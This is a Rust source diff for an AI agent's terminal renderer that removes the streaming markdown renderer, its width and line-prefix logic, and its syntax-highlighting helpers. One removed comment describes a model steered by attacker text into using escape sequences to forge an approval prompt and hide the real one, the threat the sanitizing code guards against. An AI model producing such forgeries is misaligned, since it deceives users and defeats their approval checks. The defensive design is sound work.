@@ -1,7 +1,6 @@
-//! Terminal rendering: streaming markdown renderer (syntect highlighting + termimad), tool-call
-//! indicators, checklist display, and helpers for one-off CLI status/error messages. Owns the
-//! code theme and the markdown skin, both built on the terminal's own palette, which the screen
-//! draws with too.
+//! Rendering the hosts share: the code theme and the skins the screen draws with, both built on the
+//! terminal's own palette, the thinking row's preview, the stage directions a replay stands for,
+//! the status lines, and the helpers for one-off CLI messages.
 
 use std::{
     io::{self, Write},
@@ -15,7 +14,6 @@ use syntect::{
     easy::HighlightLines,
     highlighting::Theme,
     parsing::{SyntaxReference, SyntaxSet},
-    util::LinesWithEndings,
 };
 use termimad::{Alignment, CompoundStyle, MadSkin};
 
@@ -27,763 +25,24 @@ pub(crate) mod tui;
 
 use self::tool_params::*;
 pub(crate) use self::{
-    history::nudge_direction,
-    output::*,
-    status::*,
-    tool_params::{render_tool_indicator, render_whole_params},
+    history::nudge_direction, output::*, status::*, tool_params::render_whole_params,
 };
-use crate::{
-    config::{RenderMode, ToolParams},
-    streams::write_stderr_line,
-    text::{
-        CSI_PATTERN, TAB_WIDTH, TRUNCATION_MARKER, display_width, elide_to_width,
-        format_token_count, sanitize_stream_text, sanitize_to_line, truncate_to_width,
-        wrap_to_width,
-    },
-    tools::resolve_primary_param,
+use crate::text::{
+    TRUNCATION_MARKER, display_width, elide_to_width, format_token_count, sanitize_to_line,
+    truncate_to_width, wrap_to_width,
 };
 
-/// `[display].max_width`, or `None` to follow the terminal. Set once at startup.
-static CONFIGURED_MAX_WIDTH: OnceLock<Option<usize>> = OnceLock::new();
-/// Columns used when there is no terminal to measure. Fixed rather than guessed so a piped or
-/// captured run produces the same bytes every time.
-const FALLBACK_OUTPUT_WIDTH: usize = 100;
 /// Narrowest width at which a line can be composed at all.
 ///
-/// Not a legibility floor -- [`crate::config`] clamps a *configured* width to a much higher one for
-/// that. This is arithmetic. Every budget here subtracts fixed chrome first, and the widest such
-/// chrome is [`THINKING_PREFIX`]; below it the subtraction leaves nothing, and the promise the rest
-/// of the file is built on -- that no composed line exceeds the width it was handed -- stops being
-/// satisfiable at all. This leaves a few columns above that so each surface can still show a
-/// truncation marker rather than only its own prefix.
+/// Not a legibility floor. This is arithmetic. Every budget here subtracts fixed chrome first, and
+/// the widest such chrome is the screen's thinking row label; below it the subtraction leaves
+/// nothing, and the promise the rest of the file is built on -- that no composed line exceeds the
+/// width it was handed -- stops being satisfiable at all. This leaves a few columns above that so
+/// each surface can still show a truncation marker rather than only its own prefix.
 ///
 /// A terminal this narrow wraps meka's chrome whatever the width says, so composing at the
 /// narrowest width that still works costs nothing that was not already lost.
 pub(crate) const MIN_OUTPUT_WIDTH: usize = 20;
-
-/// Record the configured width. Called once from startup, before anything renders.
-///
-/// A second call is ignored rather than being an error: startup is the only caller, and a process
-/// that somehow reached here twice wants the width it began with rather than a panic. Tests never
-/// touch this -- every function that composes a line takes its width as an argument, which is why
-/// they can.
-pub(crate) fn set_max_width(configured: Option<usize>) {
-    if CONFIGURED_MAX_WIDTH.set(configured).is_err() {
-        tracing::debug!("max width already set; ignoring a second call");
-    }
-}
-
-/// The widest line meka may compose from model output.
-///
-/// A configured width wins outright rather than being clamped to the terminal: pinning it is how
-/// you get identical output across machines, and clamping would silently take that away on a narrow
-/// one. The cost is that a value wider than the terminal wraps, which is the user's choice to make
-/// and is documented at the setting.
-///
-/// Unset, this is the terminal's width, so nothing ever wraps. Gated on **stderr** because that is
-/// where every caller writes; [`StreamingRenderer`] gates the same check on stdout because
-/// assistant text goes there instead.
-///
-/// Both paths come back through [`resolve_output_width`], which is why every composition function
-/// may state its width bound without an exception for absurd terminals.
-pub(crate) fn output_width() -> usize {
-    resolve_output_width(
-        CONFIGURED_MAX_WIDTH.get().copied().flatten(),
-        std::io::IsTerminal::is_terminal(&std::io::stderr())
-            .then(|| termimad::terminal_size().0 as usize),
-    )
-}
-
-/// The width arithmetic behind [`output_width`], with the two things it cannot test taken as
-/// arguments: what was configured, and what the terminal measured (`None` when there is no terminal
-/// to ask).
-///
-/// Split out because the floor is the precondition every other width bound in this file assumes,
-/// and a precondition applied on only one of two paths is exactly the kind of gap that survives
-/// review.
-fn resolve_output_width(configured: Option<usize>, measured: Option<usize>) -> usize {
-    configured
-        .or_else(|| measured.filter(|width| *width > 0))
-        .unwrap_or(FALLBACK_OUTPUT_WIDTH)
-        .max(MIN_OUTPUT_WIDTH)
-}
-
-/// What the next byte written owes the block it belongs to.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum Owes {
-    /// The label is due: nothing has been written yet, or a foreign line has interrupted the block
-    /// since.
-    Opening,
-    /// A row ended, so the next row starts with the indent.
-    Continuation,
-    /// The cursor is mid-row: a previous write ended without a newline.
-    Nothing,
-}
-
-/// The label and indent worn by a block meka prints *around* model text rather than as the answer.
-///
-/// The indent is a boundary, not decoration. Reasoning printed at column zero in the same gray
-/// `render_session_id` and `render_hint` use renders byte-for-byte like meka's own chrome, and a
-/// model needs no escape sequence to write a line reading `Resuming session: <uuid>`. Applying it
-/// here, at the point bytes leave, is what gives every render mode the boundary from one definition
-/// rather than one per mode.
-#[derive(Debug, Clone, Copy)]
-struct Lead {
-    opening: &'static str,
-    continuation: &'static str,
-    color: Color,
-}
-
-impl Lead {
-    /// Prefix and color each row of `text`, returning what to write and what the next write owes.
-    ///
-    /// Pure so the row arithmetic can be tested without a terminal, for the same reason
-    /// [`crate::console::step`] is: a wrong answer here puts model text at column zero, and in a
-    /// dispatch that also prints, the only way to see it is to run a terminal and look.
-    ///
-    /// An empty row wears no prefix and does not spend the opening. Emitting the indent on a blank
-    /// line would leave trailing whitespace, and spending the label there would put it above the
-    /// text instead of in front of it.
-    fn apply(&self, text: &str, mut owes: Owes) -> (String, Owes) {
-        let mut out = String::new();
-        for segment in text.split_inclusive('\n') {
-            let ends_row = segment.ends_with('\n');
-            let content = segment.strip_suffix('\n').unwrap_or(segment);
-            if content.is_empty() {
-                if ends_row {
-                    out.push('\n');
-                    // The row the cursor was mid-way through has ended, so the next one is a
-                    // continuation. An owed opening or continuation survives the blank untouched.
-                    if owes == Owes::Nothing {
-                        owes = Owes::Continuation;
-                    }
-                }
-                continue;
-            }
-            let prefix = match owes {
-                Owes::Opening => self.opening,
-                Owes::Continuation => self.continuation,
-                Owes::Nothing => "",
-            };
-            // Colored per row rather than per block: a row may be written across several calls,
-            // and crossterm emits the span's closing reset when the value is formatted, so a span
-            // held open across a return has nothing to close it but whatever prints next.
-            out.push_str(&format!(
-                "{}",
-                format!("{prefix}{content}").with(self.color)
-            ));
-            if ends_row {
-                out.push('\n');
-            }
-            owes = if ends_row {
-                Owes::Continuation
-            } else {
-                Owes::Nothing
-            };
-        }
-        (out, owes)
-    }
-}
-
-pub(crate) struct StreamingRenderer {
-    buffer: String,
-    skin: MadSkin,
-    mode: RenderMode,
-    pub(crate) started: bool,
-    raw_table_lines: Vec<String>,
-    code_block_lines: Vec<String>,
-    /// Fixed render width. `None` for the answer, where the real terminal width is the right
-    /// answer and tests set it so their expected output doesn't depend on the terminal the suite
-    /// happens to run under. Always `Some` for a block wearing a [`Lead`], whose width budget is
-    /// the terminal minus the label.
-    width: Option<usize>,
-    sink: Sink,
-    /// The label and indent every row wears, and how much of it the next write owes. `None` for
-    /// the answer, which owns its stream and needs no boundary drawn around it.
-    lead: Option<(Lead, Owes)>,
-    /// Whether a fenced block is syntax-highlighted. False for a block that must stay one color,
-    /// where [`render_code_block_to_string`]'s 24-bit output would be the one thing in it that
-    /// isn't.
-    highlight_code: bool,
-    /// Blank rows written but not yet released. See [`Self::write`].
-    held_blank_rows: usize,
-    /// Whether the last write left the cursor mid-row. See [`Self::settle_last_row`].
-    row_open: bool,
-    /// Test-only sink standing in for the terminal.
-    ///
-    /// The properties worth testing here -- that no row exceeds the width, and that no row after
-    /// the first starts at column zero -- are properties of the bytes that reach the stream, so a
-    /// test that reconstructed them from the pieces would be asserting about a different function
-    /// than the one that runs.
-    #[cfg(test)]
-    capture: Option<String>,
-}
-
-impl StreamingRenderer {
-    pub(crate) fn new(mode: RenderMode) -> Self {
-        Self {
-            buffer: String::new(),
-            // Only the termimad path renders through the skin, and building it forces the ~1 MB
-            // syntax-set load, which `Raw` otherwise never pays for.
-            skin: match mode {
-                RenderMode::Termimad => markdown_skin().clone(),
-                RenderMode::Raw => MadSkin::default(),
-            },
-            mode,
-            started: false,
-            raw_table_lines: Vec::new(),
-            code_block_lines: Vec::new(),
-            width: None,
-            sink: Sink::Stdout,
-            lead: None,
-            highlight_code: true,
-            held_blank_rows: 0,
-            row_open: false,
-            #[cfg(test)]
-            capture: None,
-        }
-    }
-
-    /// A renderer for a thinking block: stderr, one color throughout, behind `Thinking... `.
-    pub(crate) fn for_thinking(mode: RenderMode) -> Self {
-        // Built from `Raw` rather than from `mode`, then given its own skin. Struct-update syntax
-        // evaluates the whole base first, so taking it from `mode` would build `markdown_skin()` --
-        // paying the ~1 MB syntax-set load `Self::new`'s own comment is about -- for a value thrown
-        // away on the next line.
-        let mut renderer = Self::new(RenderMode::Raw);
-        renderer.mode = mode;
-        renderer.skin = match mode {
-            RenderMode::Termimad => thinking_skin().clone(),
-            RenderMode::Raw => MadSkin::default(),
-        };
-        // Row one rides behind the label and later rows behind the indent, so budgeting for the
-        // wider of the two makes every row fit: `12 + (width - 12)` and `2 + (width - 12)`.
-        renderer.width = Some(output_width().saturating_sub(display_width(THINKING_PREFIX)));
-        renderer.sink = Sink::Stderr;
-        renderer.lead = Some((
-            Lead {
-                opening: THINKING_PREFIX,
-                continuation: TOOL_PARAM_INDENT,
-                color: Color::DarkGrey,
-            },
-            Owes::Opening,
-        ));
-        renderer.highlight_code = false;
-        renderer
-    }
-
-    /// Pin the render width instead of reading the terminal's. Test-only: production always wants
-    /// the live width.
-    #[cfg(test)]
-    fn with_width(mut self, width: usize) -> Self {
-        self.width = Some(width);
-        self
-    }
-
-    /// Collect output instead of writing it, and pin the width the terminal would have given.
-    #[cfg(test)]
-    fn capturing(mut self, width: usize) -> Self {
-        self.capture = Some(String::new());
-        self.width = Some(width);
-        self
-    }
-
-    /// Everything written so far.
-    #[cfg(test)]
-    fn captured(&self) -> &str {
-        self.capture.as_deref().unwrap_or_default()
-    }
-
-    /// Write through the sink, wearing the lead when there is one.
-    ///
-    /// **Blank rows** are held back, never the newline that ends a row of text. A markdown chunk
-    /// cut at a paragraph break carries that break as a trailing blank line, which separates it
-    /// from the *next* chunk -- and when no next chunk comes, it is a blank row at the end of
-    /// the block. Separating one block from the next belongs to [`crate::console`], which adds
-    /// its own, so a block ending in one is a doubled gap. Holding them means the question "is
-    /// anything following this?" is answered by what happens next instead of guessed at when it
-    /// cannot be known.
-    ///
-    /// The terminator of an open row goes out immediately, which is what keeps `crate::console`'s
-    /// [`crate::console::RowState`] honest: it tracks who has parked the cursor mid-row, and a
-    /// renderer holding a terminator back would be a third such writer that the state machine does
-    /// not model. A mid-turn `tracing` line would then be appended to the model's last row instead
-    /// of settling it first, and a piped answer would end without a newline. The one row left open
-    /// on purpose is the label's, spent ahead of its text by [`Self::open_lead`]; the console ends
-    /// it through [`Self::interrupt`] before any other writer prints.
-    fn write(&mut self, text: &str) -> io::Result<()> {
-        if text.is_empty() {
-            return Ok(());
-        }
-        let (body, trailing) = split_held_newlines(text);
-        let mut pending = String::new();
-        if !body.is_empty() {
-            for _ in 0..std::mem::take(&mut self.held_blank_rows) {
-                pending.push('\n');
-            }
-            pending.push_str(&body);
-            self.row_open = true;
-        }
-        if trailing > 0 {
-            // Whether the first newline *terminates* a row or *is* a blank one depends on whether a
-            // row is open, not on whether this call wrote the content: the syntect path writes a
-            // highlighted line and its newline in two calls, so a terminator arrives with an empty
-            // body. Reading that as a blank row holds it, and the hold is dropped at close, ending
-            // the answer's last line without a newline on the stream a caller pipes.
-            if self.row_open {
-                pending.push('\n');
-                self.row_open = false;
-                self.held_blank_rows += trailing - 1;
-            } else {
-                self.held_blank_rows += trailing;
-            }
-        }
-        self.write_through(&pending)
-    }
-
-    /// Close the block: drop the blank rows held behind it, and end the row if one is still open.
-    fn settle_last_row(&mut self) -> io::Result<()> {
-        self.held_blank_rows = 0;
-        if !std::mem::take(&mut self.row_open) {
-            return Ok(());
-        }
-        self.write_through("\n")
-    }
-
-    /// Make way for another writer about to take the terminal mid-block.
-    ///
-    /// A labeled block resumes below the foreign line the way it began, behind its label, rather
-    /// than as an indented paragraph under a line that is not its own. The row is ended through the
-    /// lead so the resumption starts a row, and the blank rows held behind the last paragraph are
-    /// dropped: the foreign line now separates that paragraph from what resumes, and a blank
-    /// released ahead of the resumed text would land between the label and its text. The answer
-    /// wears no label and keeps its held blanks, so its next paragraph is spaced as it would have
-    /// been: the foreign line is invisible to its layout.
-    pub(crate) fn interrupt(&mut self) -> io::Result<()> {
-        if std::mem::take(&mut self.row_open) {
-            self.write_through("\n")?;
-        }
-        if let Some((_, owes)) = self.lead.as_mut() {
-            *owes = Owes::Opening;
-            self.held_blank_rows = 0;
-        }
-        Ok(())
-    }
-
-    /// Whether the last write left the cursor mid-row, for the console's tests.
-    #[cfg(test)]
-    pub(crate) fn is_row_open(&self) -> bool {
-        self.row_open
-    }
-
-    /// Write the lead's label ahead of its text, at the first delta of the block and at the first
-    /// after an interruption; a no-op whenever the label is not owed.
-    ///
-    /// Every mode holds text back until it settles (a line, a paragraph, a whole table), so
-    /// nothing else can mark the phase while the first of it is still arriving. On the screen the
-    /// label takes the row the transient indicator gives up at this same delta, which otherwise
-    /// stays blank for as long as the first paragraph takes.
-    fn open_lead(&mut self) -> io::Result<()> {
-        let Some((lead, owes)) = self.lead.as_mut() else {
-            return Ok(());
-        };
-        if *owes != Owes::Opening {
-            return Ok(());
-        }
-        let label = format!("{}", lead.opening.with(lead.color));
-        *owes = Owes::Nothing;
-        self.row_open = true;
-        self.write_bytes(&label)
-    }
-
-    /// The write itself, once what to write has been decided.
-    fn write_through(&mut self, text: &str) -> io::Result<()> {
-        if text.is_empty() {
-            return Ok(());
-        }
-        let text = match self.lead.as_mut() {
-            None => std::borrow::Cow::Borrowed(text),
-            Some((lead, owes)) => {
-                let (led, next) = lead.apply(text, *owes);
-                *owes = next;
-                std::borrow::Cow::Owned(led)
-            }
-        };
-        self.write_bytes(&text)
-    }
-
-    /// The bytes as they leave, to the sink or to a test's capture.
-    fn write_bytes(&mut self, text: &str) -> io::Result<()> {
-        #[cfg(test)]
-        if let Some(capture) = self.capture.as_mut() {
-            capture.push_str(text);
-            return Ok(());
-        }
-        self.sink.write(text)
-    }
-
-    /// Write one line of *plain* text, wrapped to the budget when there is one.
-    ///
-    /// Every line-oriented write goes through here rather than through [`Self::write`] directly,
-    /// because the budget is the only thing keeping a row inside the terminal -- and a row wider
-    /// than the terminal is wrapped by the terminal instead, which puts the continuation at column
-    /// zero with no indent in front of it. A table row and a code fence reach the terminal by
-    /// different routes than a paragraph does, so one definition is what leaves no sibling to
-    /// forget the bound.
-    ///
-    /// Only for text meka has not already laid out. termimad's rows arrive wrapped and carrying
-    /// escapes, and go through [`Self::write`] unmeasured.
-    fn write_line(&mut self, line: &str) -> io::Result<()> {
-        let Some(width) = self.width else {
-            return self.write(&format!("{line}\n"));
-        };
-        // No ceiling on rows: `show_content = true` is a request to see the whole block, and the
-        // answer this shares a renderer with has never had one either.
-        for row in wrap_to_width(line, width, usize::MAX) {
-            self.write(&format!("{row}\n"))?;
-        }
-        Ok(())
-    }
-
-    pub(crate) fn push_delta(&mut self, delta: &str) -> io::Result<()> {
-        // Streamed assistant text is the largest model-controlled surface meka prints, and it was
-        // the only one arriving unfiltered: the tool indicator, thinking block, checklist and
-        // approval prompt all sanitize, and each has a regression test for the forgery it prevents.
-        // The markdown renderer is not a defense -- termimad emits a `Compound`'s bytes verbatim
-        // and syntect writes the source slice through -- so a model that has read attacker
-        // text could clear the screen and repaint a convincing `[approval]` block, then let the
-        // real prompt scroll past invisibly behind a leaked `\x1b[8m`. Sanitizing here
-        // covers both render modes and every caller, rather than at each mode arm
-        // below.
-        let sanitized = sanitize_stream_text(delta);
-        // A tab is the one character [`sanitize_stream_text`] keeps that meka cannot measure: a
-        // terminal advances it to the next tab stop, so a row holding one is wider than every width
-        // bound here believes. That is only cosmetic for the answer, which owns its stream, and is
-        // not for a block wearing a [`Lead`] -- an under-measured row is wrapped by the terminal
-        // instead, and the continuation lands at column zero with no indent in front of it.
-        //
-        // Expanded rather than dropped, and to `TAB_WIDTH` rather than to one space, because that
-        // is what CommonMark does with it: a tab is a four-column tab stop, so an indented code
-        // block written with tabs is still one afterwards.
-        let sanitized = if self.lead.is_some() && sanitized.contains('\t') {
-            sanitized.replace('\t', &" ".repeat(TAB_WIDTH))
-        } else {
-            sanitized
-        };
-        let delta = sanitized.as_str();
-
-        let delta = if self.started {
-            delta
-        } else {
-            let trimmed = delta.trim_start_matches('\n');
-            if trimmed.is_empty() {
-                return Ok(());
-            }
-            self.started = true;
-            trimmed
-        };
-        self.open_lead()?;
-
-        self.buffer.push_str(delta);
-
-        match self.mode {
-            RenderMode::Termimad => self.flush_termimad(),
-            RenderMode::Raw => self.flush_raw(),
-        }
-    }
-
-    pub(crate) fn finish(&mut self) -> io::Result<()> {
-        match self.mode {
-            RenderMode::Termimad => {
-                // Not gated on a non-empty buffer: an unterminated fence whose lines have all been
-                // consumed leaves the buffer empty and the block pending, and skipping the drain
-                // here would discard it.
-                let remaining = std::mem::take(&mut self.buffer);
-                let trimmed = remaining.trim_end_matches('\n');
-                let output = self.finish_termimad_output(trimmed);
-                if !output.is_empty() {
-                    self.write(&output)?;
-                }
-            }
-            RenderMode::Raw => {
-                // Same reason the other arms aren't gated on a non-empty buffer: a reply ending in
-                // a table leaves the rows pending with nothing left in the buffer, and skipping the
-                // drain printed no table at all.
-                let remaining = std::mem::take(&mut self.buffer);
-                let trimmed = remaining.trim_end_matches('\n');
-                for line in trimmed.lines() {
-                    if is_table_line(line) {
-                        self.raw_table_lines.push(line.to_string());
-                    } else {
-                        self.flush_raw_table()?;
-                        self.write_line(line)?;
-                    }
-                }
-                self.flush_raw_table()?;
-            }
-        }
-        self.settle_last_row()?;
-        self.sink.flush()
-    }
-
-    /// Render markdown prose through termimad.
-    ///
-    /// Split out from the flush path so tests can assert on the rendered string; `term_text` reads
-    /// the real terminal width, so the tests pass an explicit one to stay deterministic.
-    fn termimad_to_string(&self, markdown: &str) -> String {
-        // Parsed by meka, not by minimad: see `render::markdown`. termimad still lays the result
-        // out and applies the skin, but the text it receives carries no markup, so nothing depends
-        // on minimad's dialect matching what the model wrote.
-        let document = markdown::MarkdownDoc::parse(markdown);
-        let width = self.width.or_else(|| {
-            // Only wrap when there is a real terminal to wrap to. With the stream redirected,
-            // `termimad::terminal_size()` reports a 50-column fallback, and reflowing an answer to
-            // 50 columns on its way into a file or another tool is narrower than anyone asked for.
-            // `None` tells termimad not to reflow at all, which is what an unbounded sink wants.
-            //
-            // Asked of the sink rather than of stdout: a block wearing a lead writes to stderr, and
-            // measuring the wrong stream is how a piped answer and a live indicator end up
-            // disagreeing about the width they share.
-            self.sink
-                .is_terminal()
-                .then(|| termimad::terminal_size().0 as usize)
-        });
-        format!(
-            "{}",
-            termimad::FmtText::from_text(&self.skin, document.to_minimad(), width)
-        )
-    }
-
-    /// Flush the termimad path, keeping fenced code blocks away from termimad.
-    ///
-    /// Code blocks are pulled out and rendered by [`render_code_block_to_string`], the same
-    /// syntect-backed renderer the `syntect` mode uses, because termimad paints a block in one flat
-    /// color with no regard for its language. Segmenting on fences rather than on `\n\n` is what
-    /// keeps a block containing a blank line whole.
-    fn flush_termimad(&mut self) -> io::Result<()> {
-        let output = self.take_termimad_output();
-        if !output.is_empty() {
-            self.write(&output)?;
-        }
-        Ok(())
-    }
-
-    /// Consume whatever of the buffer is renderable and return it, leaving anything still being
-    /// streamed behind. Separated from the printing so tests can assert on real output instead of
-    /// smoke-testing that a render didn't panic.
-    fn take_termimad_output(&mut self) -> String {
-        let mut output = String::new();
-        self.buffer = normalize_spacing(&self.buffer, !self.code_block_lines.is_empty());
-
-        // Every iteration below either stops or strictly consumes from the buffer, so the loop
-        // terminates. This tracks that invariant rather than trusting it, because the cost of
-        // getting it wrong is a frozen screen. Stopping early is harmless, since `finish` drains
-        // whatever is left.
-        let mut buffered_before = usize::MAX;
-
-        loop {
-            if self.buffer.len() >= buffered_before {
-                tracing::debug!(
-                    "termimad flush made no progress on {buffered} buffered bytes; deferring to \
-                     finish",
-                    buffered = self.buffer.len()
-                );
-                break;
-            }
-            buffered_before = self.buffer.len();
-
-            // Inside a block: accumulate whole lines until the closing fence arrives.
-            if !self.code_block_lines.is_empty() {
-                let Some(newline_pos) = self.buffer.find('\n') else {
-                    break;
-                };
-                let line = self.buffer[..newline_pos].to_string();
-                self.buffer = self.buffer[newline_pos + 1..].to_string();
-                let closes = is_code_fence(&line);
-                self.code_block_lines.push(line);
-                if closes {
-                    output.push_str(&self.take_code_block());
-                }
-                continue;
-            }
-
-            // Outside a block: hand everything up to the next opening fence to termimad, then take
-            // the fence itself. A fence only counts once its line is complete, otherwise a partial
-            // "``" at the buffer's end would be mistaken for prose.
-            match self.next_fence_offset() {
-                Some(offset) => {
-                    if offset > 0 {
-                        let prose = self.buffer[..offset].to_string();
-                        self.buffer = self.buffer[offset..].to_string();
-                        // Complete: a fence follows, so nothing more can be appended to this
-                        // segment and none of it may be held back. Holding any of it would also
-                        // put it straight back into the buffer ahead of the fence, leaving the
-                        // loop in the state it started in and spinning forever.
-                        output.push_str(&self.take_prose_output(&prose, true));
-                        continue;
-                    }
-                    let Some(newline_pos) = self.buffer.find('\n') else {
-                        break;
-                    };
-                    let fence = self.buffer[..newline_pos].to_string();
-                    self.buffer = self.buffer[newline_pos + 1..].to_string();
-                    self.code_block_lines.push(fence);
-                }
-                None => {
-                    // Not complete: the turn may still stream more text onto the end of this, so a
-                    // partial table or a partial line goes back into the buffer to be finished.
-                    let prose = std::mem::take(&mut self.buffer);
-                    output.push_str(&self.take_prose_output(&prose, false));
-                    break;
-                }
-            }
-        }
-
-        output
-    }
-
-    /// Byte offset of the next line that opens a code fence, or `None` when the buffer holds no
-    /// complete fence line. Only complete lines count, so a fence still being streamed stays in the
-    /// buffer rather than being flushed as prose.
-    fn next_fence_offset(&self) -> Option<usize> {
-        let mut offset = 0;
-        for line in self.buffer.split_inclusive('\n') {
-            if !line.ends_with('\n') {
-                return None;
-            }
-            if is_code_fence(line) {
-                return Some(offset);
-            }
-            offset += line.len();
-        }
-        None
-    }
-
-    /// Render prose, holding back anything whose meaning later text could still change.
-    ///
-    /// Markdown is retroactive: `Title` is a paragraph until a following `===` makes it a heading,
-    /// `| a | b |` is a paragraph until a following `|---|` makes it a table header, and a list
-    /// keeps absorbing lines until a non-list one arrives. So a line cannot be rendered the moment
-    /// it completes; it can only be rendered once no later text can reinterpret it.
-    ///
-    /// A blank line is that point. No block construct spans one -- a setext underline and a table
-    /// delimiter must both follow immediately -- so everything before the last blank line is
-    /// settled, and everything after it is still open. Flushing at blank lines therefore renders
-    /// whole blocks, which is also what lets a paragraph reflow to the terminal width instead of
-    /// keeping whatever line breaks the model wrote.
-    ///
-    /// `segment_is_complete` overrides this: when the caller has already found the fence that ends
-    /// the segment, nothing can be appended to it, so all of it renders. Returning any of it would
-    /// also put it back in front of that fence and leave the flush loop where it started.
-    fn take_prose_output(&mut self, prose: &str, segment_is_complete: bool) -> String {
-        if prose.is_empty() {
-            return String::new();
-        }
-        if segment_is_complete {
-            return self.termimad_to_string(prose);
-        }
-        match prose.rfind("\n\n") {
-            Some(boundary) => {
-                let (settled, open) = prose.split_at(boundary + 2);
-                self.buffer.insert_str(0, open);
-                self.termimad_to_string(settled)
-            }
-            None => {
-                self.buffer.insert_str(0, prose);
-                String::new()
-            }
-        }
-    }
-
-    /// Drain the tail at end-of-turn. A fence still open here (a truncated response, an
-    /// interrupted stream) has its remaining lines rendered as code rather than dropped.
-    ///
-    /// Prose is accumulated and rendered in one go rather than line by line, for the same reason
-    /// the streaming path flushes whole blocks: a table handed to the renderer a row at a time
-    /// becomes a separate single-row table per line, with misaligned columns and no wrapping. A
-    /// reply that ends with a table lands here, because a trailing table is held back for the
-    /// stream to finish.
-    fn finish_termimad_output(&mut self, trimmed: &str) -> String {
-        let mut output = String::new();
-        let mut prose = String::new();
-        for line in trimmed.lines() {
-            if !self.code_block_lines.is_empty() {
-                let closes = is_code_fence(line);
-                self.code_block_lines.push(line.to_string());
-                if closes {
-                    output.push_str(&self.take_code_block());
-                }
-            } else if is_code_fence(line) {
-                if !prose.is_empty() {
-                    output.push_str(&self.termimad_to_string(&std::mem::take(&mut prose)));
-                }
-                self.code_block_lines.push(line.to_string());
-            } else {
-                prose.push_str(line);
-                prose.push('\n');
-            }
-        }
-        if !prose.is_empty() {
-            output.push_str(&self.termimad_to_string(&prose));
-        }
-        output.push_str(&self.take_code_block());
-        output
-    }
-
-    fn take_code_block(&mut self) -> String {
-        if self.code_block_lines.is_empty() {
-            return String::new();
-        }
-        let lines = std::mem::take(&mut self.code_block_lines);
-        if !self.highlight_code {
-            // The fence markers stay. They are what the model wrote, and a block that must be one
-            // color has nothing else left to say "this part is code".
-            //
-            // Wrapped here rather than by the caller, because this returns a string that
-            // [`Self::write`] then emits unmeasured -- the route termimad's already-laid-out rows
-            // take. A code block is the one thing on that route meka has *not* laid out, and a
-            // minified line in one is how model text reaches the terminal wider than the row,
-            // to be wrapped by the terminal at column zero instead.
-            let width = self.width.unwrap_or(usize::MAX);
-            return lines
-                .iter()
-                .flat_map(|line| wrap_to_width(line, width, usize::MAX))
-                .map(|row| format!("{row}\n"))
-                .collect::<String>();
-        }
-        render_code_block_to_string(&lines)
-    }
-
-    fn flush_raw(&mut self) -> io::Result<()> {
-        self.buffer = normalize_spacing(&self.buffer, false);
-
-        while let Some(newline_pos) = self.buffer.find('\n') {
-            let line = self.buffer[..newline_pos].to_string();
-            self.buffer = self.buffer[newline_pos + 1..].to_string();
-
-            if is_table_line(&line) {
-                self.raw_table_lines.push(line);
-            } else {
-                self.flush_raw_table()?;
-                self.write_line(&line)?;
-            }
-        }
-        Ok(())
-    }
-
-    fn flush_raw_table(&mut self) -> io::Result<()> {
-        if self.raw_table_lines.is_empty() {
-            return Ok(());
-        }
-
-        let lines = std::mem::take(&mut self.raw_table_lines);
-        let formatted = format_table(&lines);
-        for line in &formatted {
-            self.write_line(line)?;
-        }
-        Ok(())
-    }
-}
 
 /// Ensure blank lines after markdown headers and tables when followed by non-empty content. Skips
 /// content inside code fences.
@@ -931,20 +190,6 @@ fn code_theme() -> Theme {
     }
 }
 
-/// The SGR sequence that selects a code theme color on a terminal: the palette slot's own
-/// number, or the default foreground.
-fn palette_escape(color: syntect::highlighting::Color) -> String {
-    match palette_slot(color) {
-        Some(index @ 0..=7) => format!("\x1b[3{index}m"),
-        Some(index) => format!("\x1b[9{}m", index.saturating_sub(8).min(7)),
-        None => "\x1b[39m".to_string(),
-    }
-}
-
-/// The markdown skin, cached because a skin is otherwise rebuilt per renderer (one per turn, plus
-/// one per message when reprinting history).
-static MARKDOWN_SKIN: OnceLock<MadSkin> = OnceLock::new();
-
 /// The skin for an answer: the terminal's own colors, emphasis by weight, the accent on inline
 /// code, structure in gray, and no background behind code, which would fight any terminal not
 /// already using that shade. The screen draws with this skin too, so a one-shot answer and an
@@ -977,16 +222,12 @@ pub(crate) fn quiet_skin() -> MadSkin {
     skin
 }
 
-fn markdown_skin() -> &'static MadSkin {
-    MARKDOWN_SKIN.get_or_init(quiet_skin)
-}
-
 /// The skin for a block that must read as a footnote rather than as the answer.
 ///
 /// Every element resolves to one color, so emphasis survives only as an attribute: `**a header**`
 /// arrives as bold gray rather than as the theme's heading color. The gray is how reasoning is
-/// told apart from the reply without reading it, which a block painted in [`markdown_skin`]'s
-/// palette loses.
+/// told apart from the reply without reading it, which a block painted in the answer's palette
+/// loses.
 ///
 /// Built from `MadSkin::default` rather than `default_dark`, because the only thing wanted from the
 /// base is its attributes (`Bold`, `Italic`, `CrossedOut`); every color it ships is overwritten
@@ -1009,46 +250,6 @@ fn thinking_skin() -> &'static MadSkin {
         }
         skin
     })
-}
-
-/// Returns the ANSI-escaped highlighted text without writing to stdout. Exposed for testing.
-fn highlight_markdown_to_string(text: &str) -> String {
-    let highlighter = highlighter();
-    let syntax = highlighter
-        .syntax_set
-        .find_syntax_by_name("Markdown")
-        .or_else(|| highlighter.syntax_set.find_syntax_by_extension("md"))
-        .unwrap_or_else(|| highlighter.syntax_set.find_syntax_plain_text());
-    highlight_with_syntax(text, syntax)
-}
-
-/// Highlight `text` line-by-line with an explicit syntect grammar and return it with the code
-/// theme's palette escapes. Shared core of the fence-line path and the per-language code-block
-/// path; the passed `syntax` must come from the same static [`highlighter`] so its context
-/// indices match the `syntax_set` used to resolve embeds.
-fn highlight_with_syntax(text: &str, syntax: &SyntaxReference) -> String {
-    let highlighter = highlighter();
-    let mut highlight = HighlightLines::new(syntax, &highlighter.theme);
-
-    let mut out = String::new();
-    for line in LinesWithEndings::from(text) {
-        match highlight.highlight_line(line, &highlighter.syntax_set) {
-            Ok(ranges) => {
-                for (style, text) in ranges {
-                    out.push_str(&palette_escape(style.foreground));
-                    out.push_str(text);
-                }
-            }
-            Err(error) => {
-                // Plain text rather than nothing, so a grammar failure never loses content.
-                tracing::debug!("failed to highlight a line: {error}");
-                out.push_str(line);
-            }
-        }
-    }
-    // Reset ANSI so colors don't bleed into the next prompt.
-    out.push_str("\x1b[0m");
-    out
 }
 
 /// A markdown code-fence line, e.g. ```` ```rust ```` or a bare ```` ``` ````. Indentation is
